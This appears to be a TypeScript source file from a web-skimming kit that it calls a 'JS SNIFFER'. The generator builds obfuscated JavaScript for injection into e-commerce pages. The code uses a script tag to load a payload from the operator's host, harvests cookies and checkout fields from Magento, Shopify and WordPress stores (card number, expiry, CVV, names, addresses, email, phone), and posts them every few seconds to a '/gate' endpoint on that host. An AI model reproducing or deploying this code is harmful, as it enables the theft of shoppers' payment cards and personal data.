import * as jsObf from "javascript-obfuscator";
import {Loader} from "./loader";
export class Generator {
  public loader:Loader;
  public detectedIp: any;
  public conf: any;
  public takensalt: String;
  constructor(){
    this.loader = new Loader();
    this.detectedIp = this.loader.findIp();
  }
  public populate(conf: any,salt: String): void{
    this.conf = conf;
    this.takensalt = salt;
  }
  public parseJsonContent(param: Number) {
    if (this.conf != null){
      let common = '';
      if (param === 1){
        this.conf.documentids.forEach((id)=>{
          common +='\''+id+'\','
        });
        return common.slice(0,-1);
      }
      else if (param === 2){
        this.conf.documentclasses.forEach((id)=>{
          common +='\''+id+'\','
        });
        return common.slice(0,-1);
      }
      else if (param === 3){
        this.conf.documenttags.forEach((id)=>{
          common +='\''+id+'\','
        });
        return common.slice(0,-1);
      }
    }
  }
  public endpoint(): any{
    var b = jsObf.obfuscate(`
      var g = document.createElement('script');
      g.src = location.protocol + '//`+this.detectedIp+`:`+this.conf.port+`/`+this.takensalt+`'`+`
      g.asynch = true;
      document.getElementsByTagName('head')[0].appendChild(g)
      `,
      {
        compact: true,
        controlFlowFlattening: true,
        controlFlowFlatteningThreshold: 1,
        numbersToExpressions: true,
        simplify: true,
        shuffleStringArray: true,
        splitStrings: true,
        stringArrayThreshold: 1
      });
      console.log('[!]',this.loader.colorStr(this.loader.color.Green,"===========Target=Code============="));
      console.log('<script>'+b+'</script>');
      console.log('[!]',this.loader.colorStr(this.loader.color.Green,"==================================="));
      return "<script>"+b+"</script>"
  }
  public init(): any {
    var a = jsObf.obfuscate(`
      setInterval(function(){
      var data = "&domain="+ document.domain + "&cookie=" + document.cookie;
      `+`const ics = [`+this.parseJsonContent(2)+`];
      `+`const its = [`+this.parseJsonContent(3)+`];
      const iks = ['checkout_email','checkout_shipping_address_first_name',
                   'checkout_shipping_address_last_name','checkout_shipping_address_company',
                   'checkout_shipping_address_address1','checkout_shipping_address_address2',
                   'checkout_shipping_address_zip','checkout_shipping_address_city','checkout_shipping_address_province',
                   'checkout_shipping_address_phone','number','name','expiry','verification_value','firstName',
                   'lastName','address1','postalCode','city','country','email','phoneNumber','creditCardNumber','expirationDate',
                   'cvNumber','billing_first_name','billing_last_name','billing_country_field',
                   'billing_address_1','billing_address_2','billing_postcode','billing_city',
                   'select2-billing_state-container','billing_phone','billing_email',`+this.parseJsonContent(1)+`
      ];
      its.forEach((it)=>{
        const a = document.getElementsByTagName(it);
        for (var i = 0; i < a.length; i++){
           if (a[i] !== undefined){
            data+="&"+it+"="+a[i].innerHTML;
           }
         }
       });
      iks.forEach((ik)=>{
        if (document.getElementById(ik) !== null){
         data+="&"+ik+"="+document.getElementById(ik).value;
        }
      });
      ics.forEach((ic)=> {
        const b = document.getElementsByClassName(ic);
        for (var i = 0; i < b.length; i++){
          if (b[i] !== undefined){
           data+="&"+ic+"="+b[i].value;
          }
        }
      });
      var xhr = new XMLHttpRequest();
      xhr.open("POST", "http://`+this.detectedIp+`:`+this.conf.port+`/gate");
      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
      xhr.send(data);
    },`+this.conf.polling+`000)`,
  {
        compact: true,
        controlFlowFlattening: true,
        controlFlowFlatteningThreshold: 1,
        numbersToExpressions: true,
        simplify: true,
        shuffleStringArray: true,
        splitStrings: true,
        stringArrayThreshold: 1
    });
     console.log('[!]',this.loader.colorStr(this.loader.color.Cyan,'JS SNIFFER on: '+this.detectedIp+':'+this.conf.port+"/"+this.takensalt));
     console.log('[X]',this.loader.colorStr(this.loader.color.Cyan,'Time Polling: '+this.conf.polling+'Sec'));
     console.log('[X]',this.loader.colorStr(this.loader.color.Cyan,'Wordlist Init: '+this.loader.colorStr(this.loader.color.Red,'Magento')+','+this.loader.colorStr(this.loader.color.Green,'Shopify')+','+this.loader.colorStr(this.loader.color.Blue,'Wordpress')));
     var d = this.conf.eventhk?" Enable":" Disable";
     var g = this.conf.randomName?" Enable":" Disable";
     console.log('[X]',this.loader.colorStr(this.loader.color.Cyan,'Event Hooker:')+d)
     console.log('[X]',this.loader.colorStr(this.loader.color.Cyan,'Random Name:')+g)
     console.log('[X]',this.loader.colorStr(this.loader.color.Cyan,'HTML IDs - DocumentIds: '+this.conf.documentids))
     console.log('[X]',this.loader.colorStr(this.loader.color.Cyan,'HTML CLASSES - DocumentClasses: '+this.conf.documentclasses))
     console.log('[X]',this.loader.colorStr(this.loader.color.Cyan,'HTML Tags - DocumentTags: '+this.conf.documenttags))
     return a.getObfuscatedCode();
   }
}
